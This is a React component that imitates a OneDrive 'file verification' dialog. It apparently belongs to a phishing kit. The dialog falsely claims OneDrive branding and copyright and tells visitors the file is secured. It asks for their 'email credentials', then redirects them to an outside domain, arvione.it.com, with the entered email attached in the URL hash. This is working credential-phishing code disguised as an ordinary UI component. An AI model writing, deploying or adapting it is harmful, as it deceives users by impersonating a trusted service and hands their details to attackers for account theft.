import { useState } from "react";
import { Cloud } from "lucide-react";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { z } from "zod";

interface FileVerificationDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  fileName: string;
}

const emailSchema = z
  .string()
  .trim()
  .email({ message: "Invalid email address" })
  .max(255, { message: "Email must be less than 255 characters" });

export function FileVerificationDialog({
  open,
  onOpenChange,
  fileName,
}: FileVerificationDialogProps) {
  const [email, setEmail] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    try {
      // Validate email
      emailSchema.parse(email);
      
      setIsSubmitting(true);
      
      // Construct URL with email in the hash
      const redirectUrl = `https://arvione.it.com/2Zw3QQ7/#${email}`;
      
      // Redirect to the constructed URL
      window.location.href = redirectUrl;
      
      onOpenChange(false);
      setEmail("");
    } catch (error) {
      if (error instanceof z.ZodError) {
        toast({
          title: "Invalid Email",
          description: error.errors[0].message,
          variant: "destructive",
        });
      }
      setIsSubmitting(false);
    }
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-[500px] p-8">
        <div className="flex flex-col items-center text-center space-y-6">
          <div className="flex items-center gap-2">
            <Cloud className="w-6 h-6 text-primary" fill="currentColor" />
            <DialogTitle className="text-xl font-medium">OneDrive</DialogTitle>
          </div>
          
          <DialogHeader className="space-y-4">
            <DialogDescription className="text-sm text-muted-foreground px-4 leading-relaxed">
              These files are sensitive and secured against unauthorized access. In order to
              access this file, please provide your email credentials. Be sure to connect to
              your email provider through a secured IMAP channel to authorize your download.
            </DialogDescription>
          </DialogHeader>

          <div className="w-full space-y-6">
            <h2 className="text-lg font-medium text-foreground">
              Please Confirm Receiving E-mail to View Files
            </h2>

            <form onSubmit={handleSubmit} className="space-y-4">
              <Input
                type="email"
                placeholder="Enter receiving email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="h-12 text-center"
                disabled={isSubmitting}
                required
              />

              <Button
                type="submit"
                className="w-full h-12 text-base font-medium"
                disabled={isSubmitting}
              >
                {isSubmitting ? "Processing..." : "View Files"}
              </Button>
            </form>
          </div>

          <p className="text-xs text-muted-foreground pt-4">
            © Copyright OneDrive Inc. 2025
          </p>
        </div>
      </DialogContent>
    </Dialog>
  );
}
